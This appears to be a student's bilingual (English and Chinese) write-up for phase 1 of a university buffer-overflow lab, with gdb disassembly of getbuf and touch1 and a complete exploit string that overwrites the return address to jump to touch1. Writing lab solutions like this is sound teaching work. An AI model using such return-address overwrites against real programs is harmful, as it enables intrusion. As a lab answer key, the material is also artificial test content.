@@ -1,0 +1,86 @@
+----------------------------------------------------------------------------
+ct1:
+----------------------------------------------------------------------------
+For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute
+an existing procedure.
+Function getbuf is called within CTARGET by a function test having the following C code:
+
+1 void test()
+2 {
+3 int val;
+4 val = getbuf();
+5 printf("No exploit. Getbuf returned 0x%x\n", val);
+6 }
+
+When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
+within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
+there is code for a function touch1 having the following C representation:
+
+1 void touch1()
+2 {
+3 vlevel = 1; /* Part of validation protocol */
+4 printf("Touch1!: You called touch1()\n");
+5 validate(1);
+6 exit(0);
+7 }
+
+Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
+rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
+related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly
+也就是getbuf分配的栈空间写入缓冲区空间覆盖，返回到touch1而不是test
+----------------------------------------------------------------------------
+首先需要知道getbuf函数中缓冲区的大小，以便知道需要多少字节的输入才能覆盖返回地址。找到touch1的地址,然后构造一个输入字符串，其中包含足够的数据来填充缓冲区，并在适当的位置插入 touch1 函数的地址，覆盖 getbuf 的返回地址，最后将构造好的输入字符串提供给程序，观察程序是否成功跳转到touch1函数
+----------------------------------------------------------------------------
+Dump of assembler code for function test:
+   0x0000000000401968 <+0>:     sub    $0x8,%rsp
+   0x000000000040196c <+4>:     mov    $0x0,%eax
+   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
+   0x0000000000401976 <+14>:    mov    %eax,%edx
+   0x0000000000401978 <+16>:    mov    $0x403188,%esi
+   0x000000000040197d <+21>:    mov    $0x1,%edi
+   0x0000000000401982 <+26>:    mov    $0x0,%eax
+   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
+   0x000000000040198c <+36>:    add    $0x8,%rsp
+   0x0000000000401990 <+40>:    ret
+End of assembler dump.
+x/s 0x403188 为  "No exploit.  Getbuf returned 0x%x\n"
+   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
+这一步调用getbuf，当getbuf调用完会回到test，为了不所以要修改函数返回地址
+----------------------------------------------------------------------------
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
+   0x00000000004017ac <+4>:     mov    %rsp,%rdi
+   0x00000000004017af <+7>:     call   0x401a40 <Gets>
+   0x00000000004017b4 <+12>:    mov    $0x1,%eax
+   0x00000000004017b9 <+17>:    add    $0x28,%rsp
+   0x00000000004017bd <+21>:    ret
+End of assembler dump.
+初始了40个字节用于写入,getbuf的返回地址在rsp+40处，需要修改此处的返回地址并且覆盖前面40个字节的缓冲区
+----------------------------------------------------------------------------
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
+   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
+   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>
+   0x00000000004017d8 <+24>:    mov    $0x1,%edi
+   0x00000000004017dd <+29>:    call   0x401c8d <validate>
+   0x00000000004017e2 <+34>:    mov    $0x0,%edi
+   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>
+End of assembler dump.
+touch1地址0x00000000004017c0
+----------------------------------------------------------------------------
+输入ct1.txt中的内容为字符串，从低到高读即rsp到rsp+40，又地址应该是8字节，所以需要留出8字节在rsp+40处，且x86采用小端法，所以先存低位
+----------------------------------------------------------------------------
+ct1.txt:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+----------------------------------------------------------------------------
+./hex2raw < ct1.txt > ct1raw.txt
+将文本文件进行转换成二进制文件输出
+(gdb中) r -qi ct1raw.txt   或者  (不在gdb中) ./ctarget -qi ct1raw.txt
+为什么我这个需要-i才可以?不懂
+----------------------------------------------------------------------------
